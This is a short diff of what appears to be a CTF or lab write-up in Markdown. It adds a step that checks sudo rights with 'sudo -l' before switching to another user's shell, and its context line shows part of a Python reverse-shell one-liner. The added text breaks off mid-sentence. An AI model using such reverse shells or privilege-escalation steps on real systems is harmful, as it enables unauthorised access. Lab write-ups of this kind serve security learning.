@@ -90,7 +90,19 @@ python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STRE
 - Tape `export TERM=xterm`
 
 
+### Then
 
+To verify my privileges, 
+
+```
+sudo -l
+```
+
+
+
+![](../../../../PicoCTF/PicoCTF-assets/Pasted%20image%2020260311035144.png)
+
+I can r
 
 ```
 sudo -u scriptmanager /bin/bash
